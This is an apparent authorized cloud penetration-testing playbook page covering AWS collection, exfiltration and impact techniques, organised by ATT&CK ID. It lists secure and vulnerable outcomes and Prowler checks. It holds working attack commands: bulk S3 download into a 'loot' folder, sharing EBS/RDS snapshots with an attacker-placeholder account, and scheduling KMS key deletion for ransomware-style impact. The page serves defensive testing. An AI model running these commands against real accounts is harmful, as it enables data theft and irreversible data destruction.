# AWS · Phase 6 — Collection, Exfiltration & Impact

> ATT&CK [TA0009 Collection](../_cloud-base/TA0009-collection.md) +
> [TA0010 Exfiltration](../_cloud-base/TA0010-exfiltration.md) +
> [TA0040 Impact](../_cloud-base/TA0040-impact.md). Projected onto AWS. **Impact
> actions are destructive — in an authorized test, demonstrate capability
> non-destructively (dry-run / read) unless explicitly scoped to execute.**

## Collection

#### T1530 Data from Cloud Storage
- **Service/sink:** S3, RDS, DynamoDB, EBS/snapshots.
  ```sh
  aws s3 ls ; aws s3 sync s3://<bucket> ./loot
  pacu > run s3__download_bucket
  ```
- **Positive (secure):** `AccessDenied`; bucket encrypted + policy-scoped +
  public access blocked (`s3_account_level_public_access_blocks`,
  `s3_bucket_public_access`).
- **Negative (vulnerable):** objects downloaded → data collected. Public or
  over-permissioned bucket is the finding.

## Exfiltration

#### T1537 Transfer Data to Cloud Account
- **Service/sink:** share an EBS snapshot / RDS snapshot / AMI with an **external
  account** you control — data leaves without egress traffic:
  ```sh
  aws ec2 modify-snapshot-attribute --snapshot-id <id> \
    --attribute createVolumePermission --operation-type add --user-ids <ATTACKER_ACCT>
  aws rds modify-db-snapshot-attribute --db-snapshot-identifier <id> \
    --attribute-name restore --values-to-add <ATTACKER_ACCT>
  ```
- **Positive (secure):** `AccessDenied` / SCP blocks cross-account sharing.
- **Negative (vulnerable):** share succeeds → restore in attacker account.
  Prowler `ec2_ebs_snapshot_account_block_public_access`, `rds_snapshots_public_access`.

## Impact

#### T1486 Data Encrypted for Impact (ransomware) · T1485 Data Destruction
- **Service/sink:** KMS + S3/EBS. Re-encrypt with an attacker-controlled KMS key,
  or schedule key deletion to deny access; delete snapshots/backups.
  ```sh
  aws kms schedule-key-deletion --key-id <id> --pending-window-in-days 7
  ```
- **Positive (secure):** `AccessDenied`; backups immutable (S3 Object Lock,
  cross-account vault), key-deletion restricted. Prowler
  `kms_cmk_not_deleted_unintentionally`, `backup_*`.
- **Negative (vulnerable):** able to schedule key deletion / delete backups →
  data loss. **Confirm via dry-run / permission check, don't execute in prod.**

#### T1496 Resource Hijacking (cryptomining) · T1578 Modify Cloud Compute
`ec2:RunInstances` at scale, or modifying compute infra. Impact =
cost/cryptomining. Prowler service-quota/GuardDuty crypto findings.

---
*Base: [Collection](../_cloud-base/TA0009-collection.md) ·
[Exfiltration](../_cloud-base/TA0010-exfiltration.md) ·
[Impact](../_cloud-base/TA0040-impact.md). Back to
[AWS README](README.md).*
